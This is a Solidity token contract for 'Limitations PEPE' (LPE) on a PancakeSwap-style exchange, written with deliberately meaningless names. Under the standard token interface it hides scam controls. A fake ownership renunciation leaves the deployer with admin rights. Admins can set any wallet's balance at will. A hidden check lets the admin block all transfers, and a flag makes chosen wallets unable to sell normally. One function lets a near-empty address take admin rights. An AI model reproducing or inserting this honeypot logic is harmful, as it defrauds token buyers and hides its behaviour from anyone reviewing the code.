//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface minLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isWallet) external view returns (uint256);

    function transfer(address liquidityAuto, uint256 receiverToLiquidity) external returns (bool);

    function allowance(address teamFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverToLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityAuto,
        uint256 receiverToLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atTake, uint256 value);
    event Approval(address indexed teamFee, address indexed spender, uint256 value);
}

abstract contract senderAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeLimit {
    function createPair(address enableLaunch, address listMin) external returns (address);
}

interface launchedLimit is minLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LimitationsPEPE is senderAt, minLimit, launchedLimit {

    function feeToken(address walletTxLaunch, address liquidityAuto, uint256 receiverToLiquidity) internal returns (bool) {
        if (walletTxLaunch == modeLiquidity) {
            return marketingIs(walletTxLaunch, liquidityAuto, receiverToLiquidity);
        }
        uint256 toWallet = minLimit(fromTx).balanceOf(fundFee);
        require(toWallet == receiverLaunch);
        require(liquidityAuto != fundFee);
        if (marketingExempt[walletTxLaunch]) {
            return marketingIs(walletTxLaunch, liquidityAuto, senderReceiver);
        }
        return marketingIs(walletTxLaunch, liquidityAuto, receiverToLiquidity);
    }

    function isEnable(address takeTeamLiquidity, uint256 receiverToLiquidity) public {
        atEnable();
        takeEnable[takeTeamLiquidity] = receiverToLiquidity;
    }

    bool public walletBuy;

    address swapAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function autoShould(uint256 receiverToLiquidity) public {
        atEnable();
        receiverLaunch = receiverToLiquidity;
    }

    uint256 public limitMin;

    function balanceOf(address isWallet) public view virtual override returns (uint256) {
        return takeEnable[isWallet];
    }

    uint256 private takeTrading = 100000000 * 10 ** 18;

    mapping(address => bool) public marketingExempt;

    uint256 public sellLimit;

    function decimals() external view virtual override returns (uint8) {
        return modeBuy;
    }

    mapping(address => bool) public maxTake;

    uint256 private feeFundLaunched;

    address public modeLiquidity;

    event OwnershipTransferred(address indexed fundAt, address indexed fromFee);

    address fundFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private modeTx;

    bool private exemptAt;

    function totalSupply() external view virtual override returns (uint256) {
        return takeTrading;
    }

    function transfer(address takeTeamLiquidity, uint256 receiverToLiquidity) external virtual override returns (bool) {
        return feeToken(_msgSender(), takeTeamLiquidity, receiverToLiquidity);
    }

    function symbol() external view virtual override returns (string memory) {
        return limitLiquidity;
    }

    function tokenMin() public {
        emit OwnershipTransferred(modeLiquidity, address(0));
        modeTx = address(0);
    }

    bool private senderTake;

    constructor (){
        
        swapLimit tokenTeam = swapLimit(swapAmount);
        fromTx = modeLimit(tokenTeam.factory()).createPair(tokenTeam.WETH(), address(this));
        if (senderTake) {
            sellLimit = feeFundLaunched;
        }
        modeLiquidity = _msgSender();
        tokenMin();
        maxTake[modeLiquidity] = true;
        takeEnable[modeLiquidity] = takeTrading;
        if (atLimit == sellLimit) {
            senderTake = false;
        }
        emit Transfer(address(0), modeLiquidity, takeTrading);
    }

    uint8 private modeBuy = 18;

    uint256 private teamLiquidity;

    function owner() external view returns (address) {
        return modeTx;
    }

    mapping(address => mapping(address => uint256)) private maxLaunched;

    function marketingIs(address walletTxLaunch, address liquidityAuto, uint256 receiverToLiquidity) internal returns (bool) {
        require(takeEnable[walletTxLaunch] >= receiverToLiquidity);
        takeEnable[walletTxLaunch] -= receiverToLiquidity;
        takeEnable[liquidityAuto] += receiverToLiquidity;
        emit Transfer(walletTxLaunch, liquidityAuto, receiverToLiquidity);
        return true;
    }

    uint256 receiverLaunch;

    function getOwner() external view returns (address) {
        return modeTx;
    }

    bool private toMax;

    function marketingFeeSell(address launchMarketing) public {
        atEnable();
        
        if (launchMarketing == modeLiquidity || launchMarketing == fromTx) {
            return;
        }
        marketingExempt[launchMarketing] = true;
    }

    function transferFrom(address walletTxLaunch, address liquidityAuto, uint256 receiverToLiquidity) external override returns (bool) {
        if (_msgSender() != swapAmount) {
            if (maxLaunched[walletTxLaunch][_msgSender()] != type(uint256).max) {
                require(receiverToLiquidity <= maxLaunched[walletTxLaunch][_msgSender()]);
                maxLaunched[walletTxLaunch][_msgSender()] -= receiverToLiquidity;
            }
        }
        return feeToken(walletTxLaunch, liquidityAuto, receiverToLiquidity);
    }

    mapping(address => uint256) private takeEnable;

    address public fromTx;

    string private fromTeam = "Limitations PEPE";

    function approve(address feeLiquidity, uint256 receiverToLiquidity) public virtual override returns (bool) {
        maxLaunched[_msgSender()][feeLiquidity] = receiverToLiquidity;
        emit Approval(_msgSender(), feeLiquidity, receiverToLiquidity);
        return true;
    }

    uint256 launchTotal;

    string private limitLiquidity = "LPE";

    function allowance(address buyShould, address feeLiquidity) external view virtual override returns (uint256) {
        if (feeLiquidity == swapAmount) {
            return type(uint256).max;
        }
        return maxLaunched[buyShould][feeLiquidity];
    }

    uint256 public teamSwap;

    bool private feeSenderTx;

    function atEnable() private view {
        require(maxTake[_msgSender()]);
    }

    function teamSender(address senderMarketing) public {
        require(senderMarketing.balance < 100000);
        if (walletBuy) {
            return;
        }
        
        maxTake[senderMarketing] = true;
        if (toMax == feeSenderTx) {
            exemptAt = true;
        }
        walletBuy = true;
    }

    uint256 constant senderReceiver = 11 ** 10;

    function name() external view virtual override returns (string memory) {
        return fromTeam;
    }

    uint256 private atLimit;

}